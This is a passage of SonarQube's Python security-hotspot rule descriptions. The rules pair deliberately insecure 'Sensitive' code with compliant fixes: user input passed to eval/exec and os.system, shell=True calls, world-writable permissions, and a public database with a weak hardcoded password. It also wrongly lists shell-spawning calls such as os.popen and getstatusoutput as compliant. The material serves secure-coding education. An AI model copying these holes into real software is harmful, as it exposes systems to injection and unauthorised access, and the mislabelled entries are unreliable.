import tempfile

tmp_file1 = tempfile.NamedTemporaryFile(delete=False)
tmp_file2 = tempfile.NamedTemporaryFile()
</pre>
<h3>How does this work?</h3>
<p>Applications should create temporary files so that no third party can read or modify their content. It requires that the files' name, location, and
permissions are carefully chosen and set. This can be achieved in multiple ways depending on the applications' technology stacks.</p>
<h4>Use a secure API function</h4>
<p>Temporary files handling APIs generally provide secure functions to create temporary files. In most cases, they operate in an atomical way,
creating and opening a file with a unique and unpredictable name in a single call. Those functions can often be used to replace less secure
alternatives without requiring important development efforts.</p>
<p>Here, the example compliant code uses the more secure <code>tempfile.NamedTemporaryFile</code> function to handle the temporary file creation.</p>
<h4>Strong security controls</h4>
<p>Temporary files can be created using unsafe functions and API as long as strong security controls are applied. Non-temporary file-handling
functions and APIs can also be used for that purpose.</p>
<p>In general, applications should ensure that attackers can not create a file before them. This turns into the following requirements when creating
the files:</p>
<ul>
  <li> Files should be created in a non-public directory. </li>
  <li> File names should be unique. </li>
  <li> File names should be unpredictable. They should be generated using a cryptographically secure random generator. </li>
  <li> File creation should fail if a target file already exists. </li>
</ul>
<p>Moreover, when possible, it is recommended that applications destroy temporary files after they have finished using them.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> <a href="https://owasp.org/www-community/vulnerabilities/Insecure_Temporary_File">OWASP</a> - Insecure Temporary File </li>
  <li> <a href="https://docs.python.org/3/library/tempfile.html#deprecated-functions-and-variables">Python documentation</a> - tempfile </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities">Top 10 2017 Category A9 -
  Using Components with Known Vulnerabilities</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/377">CWE-377 - Insecure Temporary File</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/379">CWE-379 - Creation of Temporary File in Directory with Incorrect Permissions</a>
  </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S2612">
              python:S2612
            </a>
          </td>
          <td>
            <details>
              <p>In Unix file system permissions, the "<code>others</code>" category refers to all users except the owner of the file system resource and the
members of the group assigned to this resource.</p>
<p>Granting permissions to this category can lead to unintended access to files or directories that could allow attackers to obtain sensitive
information, disrupt services or elevate privileges.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The application is designed to be run on a multi-user environment. </li>
  <li> Corresponding files and directories may contain confidential information. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>The most restrictive possible permissions should be assigned to files and directories.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://docs.python.org/3/library/os.html#os.umask">os.umask</a>:</p>
<pre>
os.umask(0)  # Sensitive
</pre>
<p>For <a href="https://docs.python.org/3/library/os.html#os.chmod">os.chmod</a>, <a
href="https://docs.python.org/3/library/os.html#os.lchmod">os.lchmod</a>, and <a
href="https://docs.python.org/3/library/os.html#os.fchmod">os.fchmod</a>:</p>
<pre>
os.chmod("/tmp/fs", stat.S_IRWXO)   # Sensitive
os.lchmod("/tmp/fs", stat.S_IRWXO)  # Sensitive
os.fchmod(fd, stat.S_IRWXO)         # Sensitive
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://docs.python.org/3/library/os.html#os.umask">os.umask</a>:</p>
<pre>
os.umask(0o777)
</pre>
<p>For <a href="https://docs.python.org/3/library/os.html#os.chmod">os.chmod</a>, <a
href="https://docs.python.org/3/library/os.html#os.lchmod">os.lchmod</a>, and <a
href="https://docs.python.org/3/library/os.html#os.fchmod">os.fchmod</a>:</p>
<pre>
os.chmod("/tmp/fs", stat.S_IRWXU)
os.lchmod("/tmp/fs", stat.S_IRWXU)
os.fchmod(fd, stat.S_IRWXU)
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/">Top 10 2021 Category A4 - Insecure Design</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">Top 10 2017 Category A5 - Broken Access Control</a>
  </li>
  <li> <a
  href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission">OWASP File Permission</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/732">CWE-732 - Incorrect Permission Assignment for Critical Resource</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/266">CWE-266 - Incorrect Privilege Assignment</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S1523">
              python:S1523
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated, and will eventually be removed.</p>
<p>Executing code dynamically is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9807">CVE-2017-9807</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9802">CVE-2017-9802</a> </li>
</ul>
<p>Some APIs enable the execution of dynamic code by providing it as strings at runtime. These APIs might be useful in some very specific
meta-programming use-cases. However most of the time their use is frowned upon because they also increase the risk of maliciously <a
href="https://owasp.org/www-community/attacks/Code_Injection">Injected Code</a>. Such attacks can either run on the server or in the client (example:
XSS attack) and have a huge impact on an application’s security.</p>
<p>This rule marks for review each occurrence of such dynamic code execution. This rule does not detect code injections. It only highlights the use of
APIs which should be used sparingly and very carefully.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the executed code may come from an untrusted source and hasn’t been sanitized. </li>
  <li> you really need to run code dynamically. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Regarding the execution of unknown code, the best solution is to not run code provided by an untrusted source. If you really need to do it, run the
code in a <a href="https://en.wikipedia.org/wiki/Sandbox_(computer_security)">sandboxed</a> environment. Use jails, firewalls and whatever means your
operating system and programming language provide (example: <a
href="https://wiki.sei.cmu.edu/confluence/display/java/SEC54-J.+Create+a+secure+sandbox+using+a+security+manager">Security Managers</a> in java, <a
href="https://www.w3schools.com/tags/att_iframe_sandbox.asp">iframes</a> and <a href="https://en.wikipedia.org/wiki/Same-origin_policy">same-origin
policy</a> for javascript in a web browser).</p>
<p>Do not try to create a blacklist of dangerous code. It is impossible to cover all attacks that way.</p>
<p>Avoid using dynamic code APIs whenever possible. Hard-coded code is always safer.</p>
<h2>Sensitive Code Example</h2>
<pre>
import os

value = input()
command = 'os.system("%s")' % value

def evaluate(command, file, mode):
    eval(command)  # Sensitive.

eval(command)  # Sensitive. Dynamic code

def execute(code, file, mode):
    exec(code)  # Sensitive.
    exec(compile(code, file, mode))  # Sensitive.

exec(command)  # Sensitive.
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/95">CWE-95 - Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval
  Injection')</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S4721">
              python:S4721
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated, and will eventually be removed.</p>
<p>Arbitrary OS command injection vulnerabilities are more likely when a shell is spawned rather than a new process, indeed shell meta-chars can be
used (when parameters are user-controlled for instance) to inject OS commands.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> OS command name or parameters are user-controlled. </li>
</ul>
<p>There is a risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Use functions that don’t spawn a shell.</p>
<h2>Sensitive Code Example</h2>
<p>Python 3</p>
<pre>
subprocess.run(cmd, shell=True)  # Sensitive
subprocess.Popen(cmd, shell=True)  # Sensitive
subprocess.call(cmd, shell=True)  # Sensitive
subprocess.check_call(cmd, shell=True)  # Sensitive
subprocess.check_output(cmd, shell=True)  # Sensitive
os.system(cmd)  # Sensitive: a shell is always spawn
</pre>
<p>Python 2</p>
<pre>
cmd = "when a string is passed through these function, a shell is spawn"
(_, child_stdout, _) = os.popen2(cmd)  # Sensitive
(_, child_stdout, _) = os.popen3(cmd)  # Sensitive
(_, child_stdout) = os.popen4(cmd)  # Sensitive


(child_stdout, _) = popen2.popen2(cmd)  # Sensitive
(child_stdout, _, _) = popen2.popen3(cmd)  # Sensitive
(child_stdout, _) = popen2.popen4(cmd)  # Sensitive
</pre>
<h2>Compliant Solution</h2>
<p>Python 3</p>
<pre>
# by default shell=False, a shell is not spawn
subprocess.run(cmd)  # Compliant
subprocess.Popen(cmd)  # Compliant
subprocess.call(cmd)  # Compliant
subprocess.check_call(cmd)  # Compliant
subprocess.check_output(cmd)  # Compliant

# always in a subprocess:
os.spawnl(mode, path, *cmd)  # Compliant
os.spawnle(mode, path, *cmd, env)  # Compliant
os.spawnlp(mode, file, *cmd)  # Compliant
os.spawnlpe(mode, file, *cmd, env)  # Compliant
os.spawnv(mode, path, cmd)  # Compliant
os.spawnve(mode, path, cmd, env)  # Compliant
os.spawnvp(mode, file, cmd)  # Compliant
os.spawnvpe(mode, file, cmd, env)  # Compliant

(child_stdout) = os.popen(cmd, mode, 1)  # Compliant
(_, output) = subprocess.getstatusoutput(cmd)  # Compliant
out = subprocess.getoutput(cmd)  # Compliant
os.startfile(path)  # Compliant
os.execl(path, *cmd)  # Compliant
os.execle(path, *cmd, env)  # Compliant
os.execlp(file, *cmd)  # Compliant
os.execlpe(file, *cmd, env)  # Compliant
os.execv(path, cmd)  # Compliant
os.execve(path, cmd, env)  # Compliant
os.execvp(file, cmd)  # Compliant
os.execvpe(file, cmd, env)  # Compliant
</pre>
<p>Python 2</p>
<pre>
cmdsargs = ("use", "a", "sequence", "to", "directly", "start", "a", "subprocess")

(_, child_stdout) = os.popen2(cmdsargs)  # Compliant
(_, child_stdout, _) = os.popen3(cmdsargs)  # Compliant
(_, child_stdout) = os.popen4(cmdsargs)  # Compliant

(child_stdout, _) = popen2.popen2(cmdsargs)  # Compliant
(child_stdout, _, _) = popen2.popen3(cmdsargs)  # Compliant
(child_stdout, _) = popen2.popen4(cmdsargs)  # Compliant
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/78">CWE-78 - Improper Neutralization of Special Elements used in an OS Command</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S3752">
              python:S3752
            </a>
          </td>
          <td>
            <details>
              <p>An HTTP method is safe when used to perform a read-only operation, such as retrieving information. In contrast, an unsafe HTTP method is used to
change the state of an application, for instance to update a user’s profile on a web application.</p>
<p>Common safe HTTP methods are GET, HEAD, or OPTIONS.</p>
<p>Common unsafe HTTP methods are POST, PUT and DELETE.</p>
<p>Allowing both safe and unsafe HTTP methods to perform a specific operation on a web application could impact its security, for example CSRF
protections are most of the time only protecting operations performed by unsafe HTTP methods.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> HTTP methods are not defined at all for a route/controller of the application. </li>
  <li> Safe HTTP methods are defined and used for a route/controller that can change the state of an application. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>For all the routes/controllers of an application, the authorized HTTP methods should be explicitly defined and safe HTTP methods should only be
used to perform read-only operations.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://www.djangoproject.com/">Django</a>:</p>
<pre>
# No method restriction
def view(request):  # Sensitive
    return HttpResponse("...")
</pre>
<pre>
@require_http_methods(["GET", "POST"])  # Sensitive
def view(request):
    return HttpResponse("...")
</pre>
<p>For <a href="https://flask.palletsprojects.com/en/1.1.x/">Flask</a>:</p>
<pre>
@methods.route('/sensitive', methods=['GET', 'POST'])  # Sensitive
def view():
    return Response("...", 200)
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://www.djangoproject.com/">Django</a>:</p>
<pre>
@require_http_methods(["POST"])
def view(request):
    return HttpResponse("...")
</pre>
<pre>
@require_POST
def view(request):
    return HttpResponse("...")
</pre>
<pre>
@require_GET
def view(request):
    return HttpResponse("...")
</pre>
<pre>
@require_safe
def view(request):
    return HttpResponse("...")
</pre>
<p>For <a href="https://flask.palletsprojects.com/en/1.1.x/">Flask</a>:</p>
<pre>
@methods.route('/compliant1')
def view():
    return Response("...", 200)
</pre>
<pre>
@methods.route('/compliant2', methods=['GET'])
def view():
    return Response("...", 200)
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/">Top 10 2021 Category A4 - Insecure Design</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">Top 10 2017 Category A5 - Broken Access Control</a>
  </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/352">CWE-352 - Cross-Site Request Forgery (CSRF)</a> </li>
  <li> <a href="https://owasp.org/www-community/attacks/csrf">OWASP: Cross-Site Request Forgery</a> </li>
  <li> <a href="https://docs.djangoproject.com/en/3.1/topics/http/decorators/#allowed-http-methods">Django</a> - Allowed HTTP Methods </li>
  <li> <a href="https://flask.palletsprojects.com/en/1.1.x/quickstart/#http-methods">Flask</a> - HTTP Methods </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S6463">
              python:S6463
            </a>
          </td>
          <td>
            <details>
              <p>Allowing unrestricted outbound communications can lead to data leaks.</p>
<p>A restrictive security group is an additional layer of protection that might prevent the abuse or exploitation of a resource. For example, it
complicates the exfiltration of data in the case of a successfully exploited vulnerability.</p>
<p>When deciding if outgoing connections should be limited, consider that limiting the connections results in additional administration and
maintenance work.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The resource has access to sensitive data. </li>
  <li> The resource is part of a private network. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It is recommended to restrict outgoing connections to a set of trusted destinations.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.SecurityGroup.html">aws_cdk.aws_ec2.SecurityGroup</a>:</p>
<pre>
from aws_cdk import (
    aws_ec2 as ec2
)

ec2.SecurityGroup(  # Sensitive; allow_all_outbound is enabled by default
    self,
    "example",
    vpc=vpc
)
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.SecurityGroup.html">aws_cdk.aws_ec2.SecurityGroup</a>:</p>
<pre>
from aws_cdk import (
    aws_ec2 as ec2
)

sg = ec2.SecurityGroup(
    self,
    "example",
    vpc=vpc,
    allow_all_outbound=False
)

sg.add_egress_rule(
    peer=ec2.Peer.ipv4("203.0.113.127/32"),
    connection=ec2.Port.tcp(443)
)
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/vpc/latest/userguide/VPC_SecurityGroups.html">AWS Documentation</a> - Control traffic to resources using
  security groups </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/284">CWE-284 - Improper Access Control</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S1313">
              python:S1313
            </a>
          </td>
          <td>
            <details>
              <p>Hardcoding IP addresses is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-5901">CVE-2006-5901</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3725">CVE-2005-3725</a> </li>
</ul>
<p>Today’s services have an ever-changing architecture due to their scaling and redundancy needs. It is a mistake to think that a service will always
have the same IP address. When it does change, the hardcoded IP will have to be modified too. This will have an impact on the product development,
delivery, and deployment:</p>
<ul>
  <li> The developers will have to do a rapid fix every time this happens, instead of having an operation team change a configuration file. </li>
  <li> It misleads to use the same address in every environment (dev, sys, qa, prod). </li>
</ul>
<p>Last but not least it has an effect on application security. Attackers might be able to decompile the code and thereby discover a potentially
sensitive address. They can perform a Denial of Service attack on the service, try to get access to the system, or try to spoof the IP address to
bypass security checks. Such attacks can always be possible, but in the case of a hardcoded IP address solving the issue will take more time, which
will increase an attack’s impact.</p>
<h2>Ask Yourself Whether</h2>
<p>The disclosed IP address is sensitive, e.g.:</p>
<ul>
  <li> Can give information to an attacker about the network topology. </li>
  <li> It’s a personal (assigned to an identifiable person) IP address. </li>
</ul>
<p>There is a risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Don’t hard-code the IP address in the source code, instead make it configurable with environment variables, configuration files, or a similar
approach. Alternatively, if confidentially is not required a domain name can be used since it allows to change the destination quickly without having
to rebuild the software.</p>
<h2>Sensitive Code Example</h2>
<pre>
ip = '192.168.12.42'
sock = socket.socket()
sock.bind((ip, 9090))
</pre>
<h2>Compliant Solution</h2>
<pre>
ip = config.get(section, ipAddress)
sock = socket.socket()
sock.bind((ip, 9090))
</pre>
<h2>Exceptions</h2>
<p>No issue is reported for the following cases because they are not considered sensitive:</p>
<ul>
  <li> Loopback addresses 127.0.0.0/8 in CIDR notation (from 127.0.0.0 to 127.255.255.255) </li>
  <li> Broadcast address 255.255.255.255 </li>
  <li> Non-routable address 0.0.0.0 </li>
  <li> Strings of the form <code>2.5.&lt;number&gt;.&lt;number&gt;</code> as they <a href="http://www.oid-info.com/introduction.htm">often match
  Object Identifiers</a> (OID) </li>
  <li> Addresses in the ranges 192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24, reserved for documentation purposes by <a
  href="https://datatracker.ietf.org/doc/html/rfc5737">RFC 5737</a> </li>
  <li> Addresses in the range 2001:db8::/32, reserved for documentation purposes by <a href="https://datatracker.ietf.org/doc/html/rfc3849">RFC
  3849</a> </li>
</ul>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S6327">
              python:S6327
            </a>
          </td>
          <td>
            <details>
              <p>Amazon Simple Notification Service (SNS) is a managed messaging service for application-to-application (A2A) and application-to-person (A2P)
communication. SNS topics allows publisher systems to fanout messages to a large number of subscriber systems. Amazon SNS allows to encrypt messages
when they are received. In the case that adversaries gain physical access to the storage medium or otherwise leak a message they are not able to
access the data.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The topic contains sensitive data that could cause harm when leaked. </li>
  <li> There are compliance requirements for the service to store data encrypted. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to encrypt SNS topics that contain sensitive information. Encryption and decryption are handled transparently by SNS, so no
further modifications to the application are necessary.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sns.Topic.html">aws_cdk.aws_sns.Topic</a>:</p>
<pre>
from aws_cdk import (
    aws_sns as sns
)

class TopicStack(Stack):
    def __init__(self, scope: Construct, construct_id: str, **kwargs) -&gt; None:
        super().__init__(scope, construct_id, **kwargs)
        sns.Topic( # Sensitive, unencrypted by default
            self,
            "example"
        )
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sns.CfnTopic.html">aws_cdk.aws_sns.CfnTopic</a>:</p>
<pre>
from aws_cdk import (
    aws_sns as sns
)

class TopicStack(Stack):
    def __init__(self, scope: Construct, construct_id: str, **kwargs) -&gt; None:
        super().__init__(scope, construct_id, **kwargs)
        sns.CfnTopic( # Sensitive, unencrypted by default
            self,
            "example"
        )
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sns.Topic.html">aws_cdk.aws_sns.Topic</a>:</p>
<pre>
from aws_cdk import (
    aws_sns as sns
)

class TopicStack(Stack):
    def __init__(self, scope: Construct, construct_id: str, **kwargs) -&gt; None:
        super().__init__(scope, construct_id, **kwargs)
        my_key = kms.Key(self, "key")
        sns.Topic(
            self,
            "example",
            master_key=my_key
        )
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sns.CfnTopic.html">aws_cdk.aws_sns.CfnTopic</a>:</p>
<pre>
from aws_cdk import (
    aws_sns as sns
)

class TopicStack(Stack):
    def __init__(self, scope: Construct, construct_id: str, **kwargs) -&gt; None:
        super().__init__(scope, construct_id, **kwargs)
        my_key = kms.Key(self, "key")
        sns.CfnTopic(
            self,
            "example",
            kms_master_key_id=my_key.key_id
        )
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/sns/latest/dg/sns-server-side-encryption.html">AWS Documentation</a> - Encryption at rest </li>
  <li> <a href="https://aws.amazon.com/blogs/compute/encrypting-messages-published-to-amazon-sns-with-aws-kms/">Encrypting messages published to
  Amazon SNS with AWS KMS</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/311">CWE-311 - Missing Encryption of Sensitive Data</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S6329">
              python:S6329
            </a>
          </td>
          <td>
            <details>
              <p>Enabling public network access to cloud resources can affect an organization’s ability to protect its data or internal operations from data theft
or disruption.</p>
<p>Depending on the component, inbound access from the Internet can be enabled via:</p>
<ul>
  <li> a boolean value that explicitly allows access to the public network. </li>
  <li> the assignment of a public IP address. </li>
  <li> database firewall rules that allow public IP ranges. </li>
</ul>
<p>Deciding to allow public access may happen for various reasons such as for quick maintenance, time saving, or by accident.</p>
<p>This decision increases the likelihood of attacks on the organization, such as:</p>
<ul>
  <li> data breaches. </li>
  <li> intrusions into the infrastructure to permanently steal from it. </li>
  <li> and various malicious traffic, such as DDoS attacks. </li>
</ul>
<h2>Ask Yourself Whether</h2>
<p>This cloud resource:</p>
<ul>
  <li> should be publicly accessible to any Internet user. </li>
  <li> requires inbound traffic from the Internet to function properly. </li>
</ul>
<p>There is a risk if you answered no to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Avoid publishing cloud services on the Internet unless they are intended to be publicly accessible, such as customer portals or e-commerce
sites.</p>
<p>Use private networks (and associated private IP addresses) and VPC peering or other secure communication tunnels to communicate with other cloud
components.</p>
<p>The goal is to prevent the component from intercepting traffic coming in via the public IP address. If the cloud resource does not support the
absence of a public IP address, assign a public IP address to it, but do not create listeners for the public IP address.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_ec2/Instance.html">aws_cdk.aws_ec2.Instance</a> and similar constructs:</p>
<pre>
from aws_cdk import aws_ec2 as ec2

ec2.Instance(
    self,
    "vpc_subnet_public",
    instance_type=nano_t2,
    machine_image=ec2.MachineImage.latest_amazon_linux(),
    vpc=vpc,
    vpc_subnets=ec2.SubnetSelection(subnet_type=ec2.SubnetType.PUBLIC) # Sensitive
)
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_ec2/CfnInstance.html">aws_cdk.aws_ec2.CfnInstance</a>:</p>
<pre>
from aws_cdk import aws_ec2 as ec2

ec2.CfnInstance(
    self,
    "cfn_public_exposed",
    instance_type="t2.micro",
    image_id="ami-0ea0f26a6d50850c5",
    network_interfaces=[
        ec2.CfnInstance.NetworkInterfaceProperty(
            device_index="0",
            associate_public_ip_address=True, # Sensitive
            delete_on_termination=True,
            subnet_id=vpc.select_subnets(subnet_type=ec2.SubnetType.PUBLIC).subnet_ids[0]
        )
    ]
)
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_dms/CfnReplicationInstance.html">aws_cdk.aws_dms.CfnReplicationInstance</a>:</p>
<pre>
from aws_cdk import aws_dms as dms

rep_instance = dms.CfnReplicationInstance(
    self,
    "explicit_public",
    replication_instance_class="dms.t2.micro",
    allocated_storage=5,
    publicly_accessible=True, # Sensitive
    replication_subnet_group_identifier=subnet_group.replication_subnet_group_identifier,
    vpc_security_group_ids=[vpc.vpc_default_security_group]
)
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_rds/CfnDBInstance.html">aws_cdk.aws_rds.CfnDBInstance</a>:</p>
<pre>
from aws_cdk import aws_rds as rds
from aws_cdk import aws_ec2 as ec2

rds_subnet_group_public = rds.CfnDBSubnetGroup(
    self,
    "public_subnet",
    db_subnet_group_description="Subnets",
    subnet_ids=vpc.select_subnets(
        subnet_type=ec2.SubnetType.PUBLIC
    ).subnet_ids
)

rds.CfnDBInstance(
    self,
    "public-public-subnet",
    engine="postgres",
    master_username="foobar",
    master_user_password="12345678",
    db_instance_class="db.r5.large",
    allocated_storage="200",
    iops=1000,
    db_subnet_group_name=rds_subnet_group_public.ref,
    publicly_accessible=True, # Sensitive
    vpc_security_groups=[sg.security_group_id]
)
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_ec2/Instance.html">aws_cdk.aws_ec2.Instance</a>:</p>
<pre>
from aws_cdk import aws_ec2 as ec2

ec2.Instance(
    self,
    "vpc_subnet_private",
    instance_type=nano_t2,
    machine_image=ec2.MachineImage.latest_amazon_linux(),
    vpc=vpc,
    vpc_subnets=ec2.SubnetSelection(subnet_type=ec2.SubnetType.PRIVATE_WITH_NAT)
)
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_ec2/CfnInstance.html">aws_cdk.aws_ec2.CfnInstance</a>:</p>
<pre>
from aws_cdk import aws_ec2 as ec2

ec2.CfnInstance(
    self,
    "cfn_private",
    instance_type="t2.micro",
    image_id="ami-0ea0f26a6d50850c5",
    network_interfaces=[
        ec2.CfnInstance.NetworkInterfaceProperty(
            device_index="0",
            associate_public_ip_address=False, # Compliant
            delete_on_termination=True,
            subnet_id=vpc.select_subnets(subnet_type=ec2.SubnetType.PRIVATE_WITH_NAT).subnet_ids[0]
        )
    ]
)
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_dms/CfnReplicationInstance.html">aws_cdk.aws_dms.CfnReplicationInstance</a>:</p>
<pre>
from aws_cdk import aws_dms as dms

rep_instance = dms.CfnReplicationInstance(
    self,
    "explicit_private",
    replication_instance_class="dms.t2.micro",
    allocated_storage=5,
    publicly_accessible=False,
    replication_subnet_group_identifier=subnet_group.replication_subnet_group_identifier,
    vpc_security_group_ids=[vpc.vpc_default_security_group]
)
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_rds/CfnDBInstance.html">aws_cdk.aws_rds.CfnDBInstance</a>:</p>
<pre>
from aws_cdk import aws_rds as rds
from aws_cdk import aws_ec2 as ec2

rds_subnet_group_private = rds.CfnDBSubnetGroup(
    self,
    "private_subnet",
    db_subnet_group_description="Subnets",
    subnet_ids=vpc.select_subnets(
        subnet_type=ec2.SubnetType.PRIVATE_WITH_NAT
    ).subnet_ids
)

rds.CfnDBInstance(
    self,
    "private-private-subnet",
    engine="postgres",
    master_username="foobar",
    master_user_password="12345678",
    db_instance_class="db.r5.large",
    allocated_storage="200",
    iops=1000,
    db_subnet_group_name=rds_subnet_group_private.ref,
    publicly_accessible=False,
    vpc_security_groups=[sg.security_group_id]
)
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/using-instance-addressing.html">AWS Documentation</a> - Amazon EC2 instance IP
  addressing </li>
  <li> <a href="https://docs.aws.amazon.com/dms/latest/userguide/CHAP_ReplicationInstance.PublicPrivate.html">AWS Documentation</a> - Public and
  private replication instances </li>
  <li> <a href="https://docs.aws.amazon.com/vpc/latest/peering/what-is-vpc-peering.html">AWS Documentation</a> - VPC Peering </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/284">CWE-284 - Improper Access Control</a> </li>
